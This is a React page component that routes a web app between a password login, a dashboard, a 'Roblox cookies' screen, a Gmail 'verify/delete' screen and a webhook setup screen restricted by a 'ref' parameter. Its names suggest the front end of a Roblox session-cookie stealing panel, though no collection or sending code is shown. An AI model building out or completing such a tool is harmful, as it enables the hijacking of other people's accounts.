import { useState } from "react";
import { RainEffect } from "@/components/ui/rain-effect";
import { SnowEffect } from "@/components/ui/snow-effect";
import { PasswordLogin } from "@/components/ui/password-login";
import { Dashboard } from "@/components/ui/dashboard";
import { RobloxCookies } from "@/components/ui/roblox-cookies";
import { VerifyGmailDelete } from "@/components/ui/verify-gmail-delete";
import { SuccessNotification } from "@/components/ui/success-notification";
import { WebhookSetup } from "@/components/ui/webhook-setup";
import { useKeepAlive } from "@/hooks/use-keep-alive";

type Screen =
  | "login"
  | "dashboard"
  | "roblox-cookies"
  | "verify-gmail"
  | "webhook-setup"
  | "success";

const Index = () => {
  const [currentScreen, setCurrentScreen] = useState<Screen>("login");

  // Activate keep-alive system to prevent timeout
  const keepAlive = useKeepAlive();

  // Check if this is a custom instance
  const urlParams = new URLSearchParams(window.location.search);
  const isCustomInstance = urlParams.get("ref");

  const handleLoginSuccess = () => {
    setCurrentScreen("dashboard");
  };

  const handleDeleteGmail = () => {
    setCurrentScreen("roblox-cookies");
  };

  const handleDeleteVerifyGmail = () => {
    setCurrentScreen("verify-gmail");
  };

  const handleCreateWebhook = () => {
    setCurrentScreen("webhook-setup");
  };

  const handleBackToDashboard = () => {
    setCurrentScreen("dashboard");
  };

  const handleSuccess = () => {
    setCurrentScreen("success");
  };

  const renderScreen = () => {
    switch (currentScreen) {
      case "login":
        return <PasswordLogin onSuccess={handleLoginSuccess} />;
      case "dashboard":
        return (
          <Dashboard
            onDeleteGmail={handleDeleteGmail}
            onDeleteVerifyGmail={handleDeleteVerifyGmail}
            // Only pass webhook creation function if NOT a custom instance
            onCreateWebhook={
              !isCustomInstance ? handleCreateWebhook : undefined
            }
          />
        );
      case "roblox-cookies":
        return (
          <RobloxCookies
            onBack={handleBackToDashboard}
            onSuccess={handleSuccess}
          />
        );
      case "verify-gmail":
        return (
          <VerifyGmailDelete
            onBack={handleBackToDashboard}
            onSuccess={handleSuccess}
          />
        );
      case "webhook-setup":
        // Only allow webhook setup for main instance
        if (!isCustomInstance) {
          return <WebhookSetup onBack={handleBackToDashboard} />;
        }
        return <PasswordLogin onSuccess={handleLoginSuccess} />;
      case "success":
        return (
          <SuccessNotification onBackToDashboard={handleBackToDashboard} />
        );
      default:
        return <PasswordLogin onSuccess={handleLoginSuccess} />;
    }
  };

  return (
    <div className="min-h-screen relative overflow-hidden">
      {/* Enhanced gradient with silver/metallic tones */}
      <div className="absolute inset-0 bg-gradient-to-br from-black via-gray-900 to-slate-800" />

      {/* Silver metallic overlay */}
      <div className="absolute inset-0 bg-gradient-to-tr from-gray-900/90 via-slate-700/50 to-gray-600/30" />

      {/* Metallic shine effect */}
      <div
        className="absolute inset-0 bg-gradient-to-br from-transparent via-gray-400/10 to-silver/20"
        style={{
          background: `linear-gradient(135deg, 
               transparent 0%, 
               rgba(192, 192, 192, 0.1) 25%, 
               rgba(169, 169, 169, 0.15) 50%, 
               rgba(128, 128, 128, 0.1) 75%, 
               transparent 100%)`,
        }}
      />

      {/* Additional dark overlay for depth */}
      <div className="absolute inset-0 bg-black/40" />

      {/* Subtle metallic pattern overlay */}
      <div
        className="absolute inset-0 opacity-5"
        style={{
          backgroundImage: `radial-gradient(circle at 2px 2px, #C0C0C0 1px, transparent 0)`,
          backgroundSize: "40px 40px",
        }}
      />

      {/* Weather effects */}
      <RainEffect />
      <SnowEffect />

      {/* Keep-alive status indicator (only visible in dev mode) */}
      {process.env.NODE_ENV === "development" && (
        <div className="fixed top-4 right-4 z-50 bg-green-600/20 border border-green-500/30 rounded-lg px-3 py-1">
          <p className="text-green-300 text-xs">🟢 Keep-Alive: Active</p>
        </div>
      )}

      {/* Main content */}
      <div className="relative z-10">{renderScreen()}</div>
    </div>
  );
};

export default Index;
